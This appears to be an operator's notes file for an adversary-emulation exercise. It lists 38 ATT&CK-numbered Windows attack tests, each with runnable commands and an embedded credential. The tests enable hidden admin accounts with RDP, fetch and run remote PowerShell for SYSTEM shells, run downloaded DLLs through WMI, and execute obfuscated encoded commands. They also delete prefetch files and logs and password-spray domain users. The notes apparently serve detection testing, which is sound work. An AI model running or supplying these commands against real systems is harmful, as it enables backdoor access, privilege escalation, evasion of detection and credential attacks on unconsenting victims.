ORION AET
Creds
	Bl@ckgumm!es

1.
:: T1078.001 Valid Accounts: Default Accounts Test 1 Enable Guest account with RDP capability and admin privileges
:: After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group, and desktop will allow multiple RDP connections.
:: Run with command prompt - Elevation required
net user lazarus_aet_operator /active:yes
net user lazarus_aet_operator L@zarus_apt99
net localgroup Administrators lazarus_aet_operator /add
net localgroup "Remote Desktop Users" lazarus_aet_operator /add
reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
::Cleanup
net user lazarus_aet_operator /active:no >nul 2>&1
net localgroup Administrators lazarus_aet_operator /delete >nul 2>&1
net localgroup "Remote Desktop Users" lazarus_aet_operator /delete >nul 2>&1
if 1 NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)
if 1 EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1)
if 1 EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)





2.
:: T1078.001 Valid Accounts: Default Accounts Test #2 - Activate Guest Account
:: Attack Commands: Run with command_prompt! Elevation Required (e.g. root or admin)
net user %Guest!!! /active:yes
:: Cleanup Commands:
net user %Guest!!! /active:no





3.
T1059.003 Test 1 Create Execute Batch Script
New-Item $env:TEMP\aet\Hutc\src\t1059.003_script.bat -Force
Set-Content -Path $env:TEMP\aet\Hutc\SRC\T1059.003_script.bat -Value "cmd /K 'c:\Program Files\TeamViewer\TeamViewer.exe'"
Start-Process $env:TEMP\AET\hUTC\src\t1059.003_script.bat





4.
# T1106 Test 1 WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jsprat000/bin/main/GetCreateProcessSystem.ps1')





5.
# T1106 Test 2 Execution through API Create Process
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:"%tmp%\AET\hUTC\outputs\t1106.exe" /target:exe C:\Users\cerquama1\AppData\Local\Temp\aet\Hutc\src\CreateProcess.cs
%tmp%/AET\hUTC\outputs\T1106.exe && (Echo success: T1106 Test 2 Execution through API Create Process) || (Echo fail: T1106 Test 2 Execution through API Create Process)





6.
# T1106 Test 3 WinPwn Get System shell bind System Shell using Create Process Technique
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jsprat000/bin/main/GetCreateProcessSystemBind.ps1')





7.
:: T1047 - Test 1 WMI Reconnaissance Users (Windows Management Instrumentation)
:: Local src file directory: c:\users\jsprat\Desktop\hUTC_AET\src
:: TEMP src file directory: %TEMP%\AET\hUTC\src
:: Output directory %TEMP%\AET\hUTC\outputs
:: Run with command shell
@Echo off
wmic useraccount get /ALL /format:csv && (Echo Success Attack: T1047 - Test 1 WMI Reconnaissance Users) || (Echo Fail Attack: T1047 - Test 1 WMI Reconnaissance Users)





8.
:: T1047 - Test 2 WMI Reconnaissance Processes (Windows Management Instrumentation)
:: Local src file directory: c:\users\jsprat\Desktop\hUTC_AET\src
:: TEMP src file directory: %TEMP%\AET\hUTC\src
:: Output directory %TEMP%\AET\hUTC\outputs
:: Run with command shell
@Echo off
wmic process get caption,executablepath,commandline /format:csv





9.
:: T1047 - Test 3 WMI Reconnaissance Software (Windows Management Instrumentation)
:: Local src file directory: c:\users\jsprat\Desktop\hUTC_AET\src
:: TEMP src file directory: %TEMP%\AET\hUTC\src
:: Output directory %TEMP%\AET\hUTC\outputs
:: Run with command shell
@Echo off
wmic qfe get description,installedOn /format:csv && (Echo Success Attack: T1047 - Test 2 WMI Reconnaissance Software) || (Echo Fail Attack: T1047 - Test 2 WMI Reconnaissance Software)





10.
:: T1047 - Test 4 WMI Reconnaissance List Remote Services (Windows Management Instrumentation)
:: Local src file directory: c:\users\jsprat\Desktop\hUTC_AET\src
:: TEMP src file directory: %TEMP%\AET\hUTC\src
:: Output directory %TEMP%\AET\hUTC\outputs
:: Run with command shell
@Echo off
wmic /node:"127.0.0.1" service where (caption like "%spooler%")





11.
:: T1047 - Test 5 WMI Reconnaissance Remote Services (Windows Management Instrumentation)
:: Local src file directory: c:\users\jsprat\Desktop\hUTC_AET\src
:: TEMP src file directory: %TEMP%\AET\hUTC\src
:: Output directory %TEMP%\AET\hUTC\outputs
:: Run with command shell
@Echo off
wmic process call create notepad.exe && (Echo Success Attack: T1047 - Test 5 WMI Reconnaissance Remote Services) || (Echo Fail Attack: T1047 - Test 5 WMI Reconnaissance Remote Services)
wmic process where name='notepad.exe' delete >nul 2>&1 && (Echo Success Cleanup: T1047 - Test 5 WMI Reconnaissance Remote Services) || (Echo Fail Cleanup: T1047 - Test 5 WMI Reconnaissance Remote Services)





12.
:: T1047 - Test  WMI Reconnaissance Remote Services (Windows Management Instrumentation)
:: Local src file directory: c:\users\jsprat\Desktop\hUTC_AET\src
:: TEMP src file directory: %TEMP%\AET\hUTC\src
:: Output directory %TEMP%\AET\hUTC\outputs
:: Run with command shell
@Echo off
wmic /user:#{user_name} /password:#{password} /node:"#{node}" process call create notepad.exe && (Echo Success Attack: T1047 - Test 6 WMI Reconnaissance Remote Services) || (Echo Fail Attack: T1047 - Test 6 WMI Reconnaissance Remote Services)
wmic /user:#{user_name} /password:#{password} /node:"#{node}" process where name='#{process_to_execute}' delete >nul 2>&1 && (Echo Success Cleanup: T1047 - Test 6 WMI Reconnaissance Remote Services) || (Echo Fail Cleanup: T1047 - Test 6 WMI Reconnaissance Remote Services)





13.
:: T1047 Test 6 - Create a Process using WMI Query and an Encoded Command
:: Local src file directory: c:\users\jsprat\Desktop\hUTC_AET\src
:: TEMP src file directory: %TEMP%\AET\hUTC\src
:: Output directory %TEMP%\AET\hUTC\outputs
:: Run with command shell
@Echo off
powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA && (Echo Success Attack: T1047 Test 7 - Create a Process using WMI Query and an Encoded Command) || (Echo Fail Attack: T1047 Test 7 - Create a Process using WMI Query and an Encoded Command)





14.
# T1047 Test 7 - Create a Process using obfuscated Win32_Process
# Local src file directory: c:\users\jsprat\Desktop\hUTC_AET\src
# TEMP src file directory: $env:TEMP\AET\hUTC\src
# Output directory $env:TEMP\AET\hUTC\outputs
# Run with powershell
# copy/paste each individual row rather than running a script. Running the script executes properly but the error handling function does not provide the proper outputs.

# Step 1 Attack
	$Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath("Win32_Process"))
	$NewClass = $Class.Derive("APT_99_Class")
	$NewClass.Put()
	Invoke-WmiMethod -Path APT_99_Class -Name create -ArgumentList notepad.exe
	If ($LASTEXITCODE -eq 0) {
	  write-host "Success Attack: T1047 Test 8 - Create a Process using obfuscated Win32_Process" -ForegroundColor Green
	} else {
		write-host "Fail Attack: T1047 Test 8 - Create a Process using obfuscated Win32_Process" -ForegroundColor Red
	}

# Step 2 Cleanup
$CleanupClass = New-Object Management.ManagementClass(New-Object Management.ManagementPath("APT_99_Class"))
try { $CleanupClass.Delete() } 
catch {
	Write-host "Attack Script Error: " -ForegroundColor Yellow
}
	




15.
# T1047 Test 8 - WMI Execute rundll32
# Local src file directory: c:\users\jsprat\Desktop\hUTC_AET\src
# TEMP src file directory: $env:TEMP\AET\hUTC\src
# Output directory $env:TEMP\AET\hUTC\outputs
# Run with powershell

# Step 1 Get Prereqs

try {
	Invoke-WebRequest "http://pics.smileposting.com/hUTC_AET/src/calc.dll?raw=true" -OutFile "$env:TEMP\AET\hUTC\outputs\calc.dll"
}
catch {
	Write-host "Get Prereq Script Error: T1047 Test 9 - WMI Execute rundll32" -ForegroundColor Yellow 
	} 

# Step 2 Check Prereqs
try {
	if (Test-Path $env:TEMP\AET\hUTC\outputs\calc.dll) {write-host "Success Check Prereq: " -ForegroundColor Green} else {write-host "Fail Check Prereq: " -ForegroundColor Red}
}
catch {Write-host "Check Prereq Script Error: " -ForegroundColor Yellow } 

# Step 3 Attack
try {
	wmic /node:127.0.0.1 process call create "rundll32.exe $env:TEMP\AET\hUTC\outputs\calc.dll StartW"
	If ($LASTEXITCODE -eq 0) {
	  write-host "Success Attack: " -ForegroundColor Green
	} else {
		write-host "Fail Attack: " -ForegroundColor Red
	}
}
catch {Write-host "Attack Script Error: " -ForegroundColor Yellow} 





16. 
# T1047 Windows Management Instrumentation Test #9 - WMI Execute rundll32
Invoke-WebRequest "https://raw.githubusercontent.com/jsprat000/bin/main/calc.dll?raw=true" -OutFile "$env:TEMP\calc.dll"
if (Test-Path $env:TEMP\calc.dll) {Write-host "prerequisites have been acquired" -ForegroundColor Green} else {Write-host "prerequisites have NOT been acquired" -ForegroundColor Red}
wmic /node:127.0.0.1 process call create "rundll32.exe $env:TEMP\calc.dll StartW"
# Cleanup
taskkill /f /im calculator.exe





17.
# T1047 Test 10 Application uninstall using WMIC
# Local src file directory: c:\users\jsprat\Desktop\hUTC_AET\src
# TEMP src file directory: $env:TEMP\AET\hUTC\src
# Output directory $env:TEMP\AET\hUTC\outputs
# Run with powershell
# Emulates uninstalling applications using WMIC. Product must installed with an msi file. 
# TightVNC password: Softrocks!

# Step 1 Get Prereqs

	Invoke-WebRequest 'https://www.tightvnc.com/download/2.8.63/tightvnc-2.8.63-gpl-setup-64bit.msi' -OutFile $env:TEMP\tightvncinstaller.msi
start-sleep -s 10
msiexec /i $env:TEMP\tightvncinstaller.msi /qn /norestart
start-sleep -s 15

if ((Test-Path "C:\Program Files\TightVNC\tvnviewer.exe")-Or (Test-Path "C:\Program Files (x86)\TightVNC\tvnviewer.exe")) {write-host "Success Check Prereq: " -ForegroundColor Green} else {write-host "Fail Check Prereq: " -ForegroundColor Red}

wmic /node:"127.0.0.1" product where "name like 'Tightvnc%%'" call uninstall

	if ((Test-Path "C:\Program Files\TightVNC\tvnviewer.exe")-Or (Test-Path "C:\Program Files (x86)\TightVNC\tvnviewer.exe")) {Write-host "Check Prereqs Script Error: T1047 Test 10 Application uninstall using WMIC" -ForegroundColor Green} else {Write-host "Check Prereqs Script Error: T1047 Test 10 Application uninstall using WMIC" -ForegroundColor Red}


catch {
	Write-host "Get Prereq Script Error: T1047 Test 10 Application uninstall using WMIC" -ForegroundColor Yellow 
	} 





18.
# T1098 - Account Manipulation Test #1 - Admin Account Manipulate
# Attack Commands: Run with powershell! Elevation Required (e.g. root or admin)
$x = Get-Random -Minimum 2 -Maximum 9999
$y = Get-Random -Minimum 2 -Maximum 9999
$z = Get-Random -Minimum 2 -Maximum 9999
$w = Get-Random -Minimum 2 -Maximum 9999
Write-Host HaHa_$x$y$z

$fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match "User" -and $_.PrincipalSource -match "Local"} | Select Name

foreach($member in $fmm) {
    if($member -like "*%Admin!!!*") {
        $account = $member.Name -replace ".+\\\","" # strip computername\
        $originalDescription = (Get-LocalUser -Name $account).Description
        Set-LocalUser -Name $account -Description "atr:$account;$originalDescription".Substring(0,48) # Keep original name in description
        Rename-LocalUser -Name $account -NewName "APT99_$x$y$z" # Required due to length limitation
        Write-Host "Successfully Renamed $account Account on " $Env:COMPUTERNAME
        }
    }
# Cleanup Commands:
$list = Get-LocalUser |?{$_.Description -like "atr:*"}
foreach($u in $list) {
  $u.Description -match "atr:(?<Name>[^;]+);(?<Description>.*)"
  Set-LocalUser -Name $u.Name -Description $Matches.Description
  Rename-LocalUser -Name $u.Name -NewName $Matches.Name
  Write-Host "Successfully Reverted Account $($u.Name) to $($Matches.Name) on " $Env:COMPUTERNAME
}





19.
# T1098 - Account Manipulation Test #9 - Password Change on Directory Service Restore Mode (DSRM) Account
# Attack Commands: Run with command_prompt! Elevation Required (e.g. root or admin)
ntdsutil "set dsrm password" "sync from domain account %Username%" "q" "q"





20.
:: T1140 - Deobfuscate/Decode Files or Information Test #1 - Deobfuscate/Decode Files Or Information
:: Run with command prompt
certutil -encode C:\Windows\System32\calc.exe %temp%\T1140_calc.txt && (Echo Successfully encoded the binary: T1140 Test 1 - Deobfuscate/Decode Files Or Information) || (Echo Failed to encode the binary: T1140 Test 1 - Deobfuscate/Decode Files Or Information)

certutil -decode %temp%\T1140_calc.txt %temp%\T1140_calc_decoded.exe && (Echo Successfully decoded the binary: T1140 Test 1 - Deobfuscate/Decode Files Or Information) || (Echo Failed to decode the binary: T1140 Test 1 - Deobfuscate/Decode Files Or Information)

:: Cleanup
del %temp%\T1140_calc.txt >nul 2>&1 && (Echo Success Cleanup Phase 1: T1140 Test 1 - Deobfuscate/Decode Files Or Information) || (Echo Fail Cleanup Phase 2: T1140 Test 1 - Deobfuscate/Decode Files Or Information)

del %temp%\T1140_calc_decoded.exe >nul 2>&1 && (Echo Success Cleanup Phase 2: T1140 Test 1 - Deobfuscate/Decode Files Or Information) || (Echo Fail Cleanup Phase 2: T1140 Test 1 - Deobfuscate/Decode Files Or Information)




21. 
:: T1140 - Deobfuscate/Decode Files or Information Test #2 - Certutil Rename and Decode
:: Run with command prompt

copy %windir%\system32\certutil.exe %temp%\tcm.tmp && (Echo Success Attack: T1140 Test 2 - Certutil Rename and Decode) || (Echo Fail Attack: T1140 Test 2 - Certutil Rename and Decode)

%temp%\tcm.tmp -encode C:\Windows\System32\calc.exe %temp%\T1140_calc2.txt && (Echo Success Attack: T1140 Test 2 - Certutil Rename and Decode) || (Echo Fail Attack: T1140 Test 2 - Certutil Rename and Decode)

%temp%\tcm.tmp -decode %temp%\T1140_calc2.txt %temp%\T1140_calc2_decoded.exe && (Echo Success Attack: T1140 Test 2 - Certutil Rename and Decode) || (Echo Fail Attack: T1140 Test 2 - Certutil Rename and Decode)

:: Cleanup
del %temp%\tcm.tmp >nul 2>&1 && (Echo Success Cleanup: T1140 Test 2 - Certutil Rename and Decode) || (Echo Fail Cleanup: T1140 Test 2 - Certutil Rename and Decode)

del %temp%\T1140_calc2.txt >nul 2>&1 && (Echo Success Cleanup: T1140 Test 2 - Certutil Rename and Decode) || (Echo Fail Cleanup: T1140 Test 2 - Certutil Rename and Decode)

del %temp%\T1140_calc2_decoded.exe >nul 2>&1 && (Echo Success Cleanup: T1140 Test 2 - Certutil Rename and Decode) || (Echo Fail Cleanup: T1140 Test 2 - Certutil Rename and Decode)





22.
:: T1070.004 - Indicator Removal on Host: File Deletion Test #1 - Delete a single file - Windows cmd
:: Run with command prompt
IF EXIST "%TEMP%\AET\hUTC\outputs\delete_t1070.004.txt" (Echo Success Get Prereq: T1070.004 - File Deletion - Test #1 - Delete a single file - Windows cmd) else (Echo Fail Get Prereq: T1070.004 - File Deletion - Test #1 - Delete a single file - Windows cmd)
echo apt99_deleted_this_file_t1070.004 >> %TEMP%\AET\hUTC\outputs\delete_t1070.004.txt
IF EXIST "%TEMP%\AET\hUTC\outputs\delete_t1070.004.txt" && (Echo Success Get Prereq: T1070.004 - File Deletion - Test #1 - Delete a single file - Windows cmd) || (Echo Fail Get Prereq: T1070.004 - File Deletion - Test #1 - Delete a single file - Windows cmd)
del /f %TEMP%\AET\hUTC\outputs\delete_t1070.004.txt && (Echo Success Attack: T1070.004 - File Deletion - Test #1 - Delete a single file - Windows cmd) || (Echo Fail Attack: T1070.004 - File Deletion - Test #1 - Delete a single file - Windows cmd)





23.
:: T1070.004 - Indicator Removal on Host: File Deletion Test #2 - Delete an entire folder - Windows cmd
:: Run with command prompt
mkdir %TEMP%\AET\hUTC\outputs\t1070_004_test2_folder
IF EXIST "%TEMP%\AET\hUTC\outputs\t1070_004_test2_folder" ( Echo Success Check Prereq:  T1070.004 - File Deletion - Test #2 - Delete an Entire Folder) ELSE ( Echo Fail Check Prereq: T1070.004 - File Deletion - Test #2 - Delete an Entire Folder)
rmdir /s /q %TEMP%\AET\hUTC\outputs\t1070_004_test2_folder




24.
# T1070.004 - Indicator Removal on Host: File Deletion Test #6 - Delete a single file - Windows PowerShell
# Run with powershell
New-Item -Path $env:TEMP\AET\hUTC\outputs\deleteAPT99_file.txt | Out-Null
	if (Test-Path $env:TEMP\AET\hUTC\outputs\deleteAPT99_file.txt) 
	{write-host "Success Check Prereq: T1070.004 Indicator Removal on Host - Test 3 - File Deletion - Powershell" -ForegroundColor Green} 
	else 
	{write-host "Fail Check Prereq: T1070.004 Indicator Removal on Host - Test 3 - File Deletion - Powershell" -ForegroundColor Red}
Remove-Item -Path $env:TEMP\AET\hUTC\outputs\deleteAPT99_file.txt
	if (Test-Path $env:TEMP\AET\hUTC\outputs\deleteAPT99_file.txt) 
	{write-host "Success Attack: T1070.004 Indicator Removal on Host - Test 3 - File Deletion - Powershell" -ForegroundColor Green} 
	else 
	{write-host "Fail Attack: T1070.004 Indicator Removal on Host - Test 3 - File Deletion - Powershell" -ForegroundColor Red}




25.
# T1070.004 - Indicator Removal on Host: File Deletion Test #7 - Delete an entire folder - Windows PowerShell
# Run with powershell
New-Item -Path $env:TEMP\AET\hUTC\outputs\deleteAPT99_folder -Type Directory | Out-Null
Remove-Item -Path $env:TEMP\AET\hUTC\outputs\deleteAPT99_folder -Recurse




26.
# T1070.004 - Indicator Removal on Host: File Deletion Test #9 - Delete Prefetch File
# Run with powershell
Remove-Item -Path (Join-Path "$Env:SystemRoot\prefetch\" (Get-ChildItem -Path "$Env:SystemRoot\prefetch\*.pf" -Name)[0])




---
27.
# Test #10 - Delete TeamViewer Log Files
# Run with powershell
New-Item -Path $env:TEMP\TeamViewer_APT99.log -Force | Out-Null
Remove-Item $env:TEMP\TeamViewer_APT99.log -Force -ErrorAction Ignore
---



28.
---
:: T1202 - Indirect Command Execution: Test 1 Indirect Command Execution - pcalua.exe
:: Attack Commands: Run with command_prompt!
pcalua.exe -a calc.exe
pcalua.exe -a C:\Windows\System32\calc.exe
---




---
29.
:: T1202 - Indirect Command Execution: Test 2 Indirect Command Execution - forfiles.exe
:: Attack Commands: Run with command_prompt!
forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe
---


---
30.
:: T1202 - Indirect Command Execution: Test 3 Indirect Command Execution - conhost.exe
:: Run with command shell
conhost.exe "notepad.exe"
---




---
31.
# T1036 - Masquerading: Test 1 - System File Copied to Unusual Location
# Attack Commands: Run with powershell
copy-item "$env:windir\System32\cmd.exe" -destination "$env:allusersprofile\cmd.exe"
start-process "$env:allusersprofile\cmd.exe"
sleep -s 5 
stop-process -name "cmd" | out-null

# Cleanup:
remove-item "$env:allusersprofile\cmd.exe" -force -erroraction silentlycontinue
---





---
32.
# T1036 - Masquerading: Test 2 - Malware Masquerading and Execution from Zip File
# Get Prereq Commands: Run with powershell
Invoke-WebRequest -OutFile "$env:userprofile\Downloads\T1036.zip" https://raw.githubusercontent.com/jsprat000/bin/main/T1036.zip

# Check Prereqs: Run with powershell
if (Test-Path $env:userprofile\Downloads\T1036.zip) {exit 0} else {exit 1}

# Cleanup: run with powershell
taskkill /IM Calculator.exe /f >$null 2>$null
Remove-Item $env:userprofile\Downloads\T1036 -recurse -ErrorAction Ignore

# Attack: Run with powershell
Expand-Archive -Path $env:userprofile\Downloads\T1036.zip -DestinationPath $env:userprofile\Downloads\T1036 -Force
cd $env:userprofile\Downloads\T1036
cmd /c $env:userprofile\Downloads\T1036\README.cmd >$null 2>$null
---


---
33.
# T1027 - Obfuscated Files or Information: Test 1 - Execute base64-encoded PowerShell 
# Attack: Run with powershell
$OriginalCommand = 'Write-Host "Hacked by APT99 - T1027 - Obfuscated Files or Information: Test 1 - Execute base64-encoded PowerShell "'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand
powershell.exe -EncodedCommand $EncodedCommand
---


---
34.
# T1027 - Obfuscated Files or Information: Test 2 - Execute base64-encoded PowerShell from Windows Registry
# Attack: Run with powershell
$OriginalCommand = 'Write-Host "Hacked by APT99 - T1027 - Obfuscated Files or Information: Test 2 - Execute base64-encoded PowerShell from Windows Registry"'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion -Name Debug -Value $EncodedCommand
powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\Microsoft\Windows\CurrentVersion Debug).Debug)))"

# Cleanup: Run with powershell
Remove-ItemProperty -Force -ErrorAction Ignore -Path HKCU:Software\Microsoft\Windows\CurrentVersion -Name Debug
---



---
35.
# T1027 - Obfuscated Files or Information: Test 4 - Execution from Compressed File

# Get Prereq Commands: Run with powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest "#{url_path}" -OutFile "$env:temp\T1027.zip"
Expand-Archive -path "$env:temp\T1027.zip" -DestinationPath "$env:temp\temp_T1027.zip\" -Force

# Check Prereq Commands:
if (Test-Path $env:temp\temp_T1027.zip\T1027.exe) {exit 0} else {exit 1}

:: Attack: Run with command shell
"%temp%\temp_T1027.zip\T1027.exe"

:: Cleanup: run with comand shell
taskkill /f /im calculator.exe >nul 2>nul
rmdir /S /Q %temp%\temp_T1027.zip >nul 2>nul
del /Q "%temp%\T1027.zip" >nul 2>nul
---


---
36.
:: T1027 - Obfuscated Files or Information: Test 8 - Obfuscated Command Line using special Unicode characters
:: Attack: Run with command shell
certutil —ૹu૰rlࢰca࣢c෯he –‮spli؅t‮‭ −"൏ᶠ൸" https://raw.githubusercontent.com/jsprat000/bin/main/LICENSE.txt %temp%\APT_99_License.txt


---
37.
:: T1110.003 - Brute Force: Password Spraying: Test 1 - Password Spray all Domain Users
:: Get Prereq Commands: Run with command shell
%temp%\T1110.003\src\parse_net_users.bat

:: Check Prereqs: Run with command shell
if not exist %temp%\users.txt (exit /b 1)

:: Attack: Run with command shell
@FOR /F %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\IPC$ /user:"%userdomain%\%n" "Spring2022" 1>NUL 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\IPC$ > NUL
---

---
38.
T1110.003 - Brute Force: Password Spraying: Test #2 - Password Spray (DomainPasswordSpray)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force
---
